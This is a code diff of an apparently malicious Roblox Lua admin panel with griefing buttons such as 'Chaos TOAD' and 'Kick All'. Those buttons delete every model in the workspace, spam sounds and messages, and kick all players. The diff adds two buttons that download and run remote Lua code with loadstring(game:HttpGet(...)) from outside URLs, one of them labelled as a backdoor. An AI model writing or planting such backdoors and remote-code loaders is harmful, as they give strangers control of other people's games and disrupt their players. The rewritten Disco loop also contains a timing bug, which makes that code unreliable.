@@ -336,72 +336,46 @@ local function createGui()
     end)
 
     createButton("Disco", function()
-        local lighting = game:GetService("Lighting")
-        local fogEffect = lighting:FindFirstChild("FogEffect") or Instance.new("ColorCorrectionEffect", lighting)
-        fogEffect.Name = "FogEffect"
+    local lighting = game:GetService("Lighting")
+    local fogEffect = lighting:FindFirstChild("FogEffect") or Instance.new("ColorCorrectionEffect", lighting)
+    fogEffect.Name = "FogEffect"
+    
+    -- Define the color sequence
+    local colors = {
+        Color3.fromRGB(255, 0, 0),       -- Red
+        Color3.fromRGB(255, 165, 0),     -- Orange
+        Color3.fromRGB(255, 255, 0),     -- Yellow
+        Color3.fromRGB(0, 255, 0),       -- Green
+        Color3.fromRGB(0, 0, 255),       -- Blue
+        Color3.fromRGB(255, 192, 203),   -- Pink
+        Color3.fromRGB(128, 0, 128)      -- Purple
+    }
+    
+    local running = true
+    local index = 1
+    local transitionTime = 2 -- Time in seconds to transition between colors
+    local startTime = os.clock()
+    
+    while running do
+        local currentTime = os.clock() - startTime
+        local progress = (currentTime % transitionTime) / transitionTime -- Progress between 0 and 1
         
-        local colors = {
-            Color3.fromRGB(255, 0, 0),
-            Color3.fromRGB(255, 165, 0),
-            Color3.fromRGB(255, 255, 0),
-            Color3.fromRGB(0, 255, 0),
-            Color3.fromRGB(0, 0, 255),
-            Color3.fromRGB(255, 192, 203),
-            Color3.fromRGB(128, 0, 128)
-        }
+        -- Get the current and next color in the sequence
+        local currentColor = colors[index]
+        local nextColor = colors[(index % #colors) + 1]
         
-        local running = true
-        local index = 1
-        local transitionTime = 2
-        local startTime = os.clock()
+        -- Interpolate between the current and next color
+        fogEffect.TintColor = currentColor:Lerp(nextColor, progress)
         
-        while running do
-            local currentTime = os.clock() - startTime
-            local progress = currentTime / transitionTime
-            
-            local currentColor = colors[index]
-            local nextColor = colors[(index % #colors) + 1]
-            
-            fogEffect.TintColor = currentColor:Lerp(nextColor, progress)
-            
-            if progress >= 1 then
-                index = index + 1
-                if index > #colors then
-                    index = 1
-                end
-                startTime = os.clock()
-            end
-            
-            task.wait()
+        -- Move to the next color when the transition is complete
+        if progress >= 1 then
+            index = (index % #colors) + 1
+            startTime = os.clock()
         end
-    end)
-
-    createButton("Disco fog", function()
-        local discoFogEnabled = not discoFogEnabled
-        local colors = {
-            Color3.fromRGB(255, 0, 0),
-            Color3.fromRGB(255, 165, 0),
-            Color3.fromRGB(255, 255, 0),
-            Color3.fromRGB(0, 255, 0),
-            Color3.fromRGB(0, 0, 255),
-            Color3.fromRGB(255, 105, 180),
-            Color3.fromRGB(128, 0, 128)
-        }
         
-        game.Lighting.FogStart = 0
-        game.Lighting.FogEnd = 100
-
-        while discoFogEnabled do
-            for _, color in ipairs(colors) do
-                if not discoFogEnabled then 
-                    game.Lighting.FogColor = Color3.fromRGB(200, 200, 200)
-                    return 
-                end
-                game.Lighting.FogColor = color
-                wait(0.3)
-            end
-        end
-    end)
+        task.wait()
+    end
+end)
 
     createButton("Ball Rain", function()
         local RunService = game:GetService("RunService")
@@ -560,7 +534,7 @@ local function createGui()
             soundInstance.SoundId = "rbxassetid://132124181828375"
             soundInstance.Looped = true
             soundInstance.Volume = 30
-            soundInstance.PlaybackSpeed = 0.8
+            soundInstance.PlaybackSpeed = 0.8 -- Set the pitch to 1 (normal speed)
             soundInstance:Play()
         end
     end)
@@ -613,6 +587,7 @@ local function createGui()
     end)
 
     createButton("Chaos TOAD", function()
+        -- Skybox Coroutine
         local sky = coroutine.create(function()
             while true do
                 local s = Instance.new("Sky", game.Lighting)
@@ -628,6 +603,7 @@ local function createGui()
         end)
         coroutine.resume(sky)
 
+        -- Model Deletion Coroutine
         local del = coroutine.create(function()
             while true do
                 for _, v in pairs(workspace:GetChildren()) do
@@ -640,11 +616,12 @@ local function createGui()
         end)
         coroutine.resume(del)
 
+        -- Sound Coroutine
         local sound = coroutine.create(function()
             local a = Instance.new("Sound", workspace)
             a.SoundId = "rbxassetid://141509625"
             a.Name = "RAINING MEN"
-            a.Volume = 10
+            a.Volume = 10 -- Reduced for safety
             a.Looped = true
             a:Play()
             while true do
@@ -662,6 +639,7 @@ local function createGui()
         end)
         coroutine.resume(sound)
 
+        -- Message Coroutine
         local msgCoroutine = coroutine.create(function()
             while true do
                 local messageInstance = Instance.new("Message", workspace)
@@ -673,6 +651,7 @@ local function createGui()
         end)
         coroutine.resume(msgCoroutine)
 
+        -- Toad Rain Coroutine (Now deletes meshes after stopping)
         local rain = coroutine.create(function()
             local noises = {
                 'rbxassetid://230287740', 
@@ -699,12 +678,14 @@ local function createGui()
                 mesh.MeshId = "rbxassetid://7234998844"
                 mesh.TextureId = "rbxassetid://1009824086"
 
+                -- Automatically delete after 5 seconds
                 task.delay(5, function()
                     if part then
                         part:Destroy()
                     end
                 end)
 
+                -- Remove sound after it stops playing
                 sound.Ended:Connect(function()
                     sound:Destroy()
                 end)
@@ -714,6 +695,7 @@ local function createGui()
         end)
         coroutine.resume(rain)
 
+        -- Background Music
         local sound = Instance.new("Sound")
         sound.Name = "Sound"
         sound.SoundId = "http://www.roblox.com/asset/?id=6153817247"
@@ -724,54 +706,25 @@ local function createGui()
         sound.Parent = game.Workspace
         sound:Play()
 
+        -- Warning Message
         local h = Instance.new("Hint", workspace)
         h.Text = "Imagin gettin toadroast skid -YaazDaQuitos"
         task.wait(999999999999999999)
         h:Destroy()
     end)
 
-    createButton("Reset Everything", function()
-    game.Lighting:ClearAllChildren()
-    game.Lighting.Ambient = Color3.new(1, 1, 1)
-    game.Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
-    game.Lighting.Brightness = 1
-    game.Lighting.FogEnd = 1000000
-    game.Lighting.FogStart = 0
-    game.Lighting.FogColor = Color3.fromRGB(255, 255, 255)
-
-    for _, v in pairs(workspace:GetChildren()) do
-        if v:IsA("Sound") or v:IsA("Message") or v:IsA("Hint") or v:IsA("Model") and v.Name == "DiscoPlayer" then
-            v:Destroy()
-        end
-    end
-
-    if game.Lighting:FindFirstChildOfClass("Sky") then
-        game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
-    end
-
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Fire") then
-            v:Destroy()
-        end
-    end
-
-    _G.Spam555 = false
-    _G.StopCoroutines = true
-
-    if _G.RunningCoroutines then
-        for _, coro in pairs(_G.RunningCoroutines) do
-            coroutine.yield(coro)
-        end
-    end
-    _G.RunningCoroutines = {}
-end)
-
-
     createButton("Kick All", function()
         for _, player in pairs(game.Players:GetPlayers()) do
             player:Kick("YAY, THANK YOU FOR STEALING MODELS!")
         end
     end)
+createButton("Sheldoni Client", function()  
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Sheldoni-gui-29377"))()  
+end)
+
+createButton("Yaaz Executor Backdooor", function()  
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/YaazLOL/refs/heads/main/yaaazzz"))()
+end)
 
     local toggleButton = Instance.new("TextButton")
     toggleButton.Size = UDim2.new(0, 100, 0, 100)
